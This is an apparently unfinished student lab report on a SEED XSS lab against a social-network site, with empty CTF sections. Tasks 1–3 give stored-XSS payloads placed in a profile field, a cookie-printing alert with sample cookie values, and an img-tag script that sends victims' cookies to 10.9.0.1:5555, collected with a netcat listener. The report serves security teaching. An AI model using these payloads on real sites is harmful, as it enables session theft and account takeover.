# Work performed during the week #10

## CTF

### Goal
- 

### Challenge 1

- 

### Challenge 2

- 

## SeedLab

### Task 1

- For the task 1, we choose to login with the user Alice. After we logged in we went to edit profile and in the input for brief discreption we add the script ``<script>alert('XSS');</script>``.

- This way, every time the brief discreption field is asked for a web page, it will execute the alert we inserted. This justifies why even in the list of users the alert is triggered. Because this list not only the users, but the brief discreption of each user.

### Task 2

- Still using user Alice, we went to edit profile and in the input for brief discreption we add another script. Instead of the script ``<script>alert('XSS');</script>`` we use the script ``<script>alert(document.cookie);</script>``, so we can now print the cookies.

- The result of the alert is ``pvisitor=a6b4dccd-99d9-4a92-a50a-9a850b3592ab; Elgg=i0mr1o4tlhlimds4ncd0da5nb7``.

### Task 3

- In this task, instead of only the user can see the cookies, we want to send an HTTP request with the cookies appended to the request in order so see them.
- In order to do that we user a script that do that, `` <script>document.write('<img src=http://10.9.0.1:5555?c=' + escape(document.cookie) + ' >');
</script> ``.
- This sript inserts the img tag, the browser tries to load the image from the URL in the src field, this results in an HTTP GET request sent to our machine, with the cookies to the port 5555 of our machine (with IP address 10.9.0.1).
- We use the program ``nc -lknv 5555``, to have a TCP server that listens for a connection on the specified port (5555).
- This program will print out the HTTP request with the cookies of the client.

### Task 4

- 


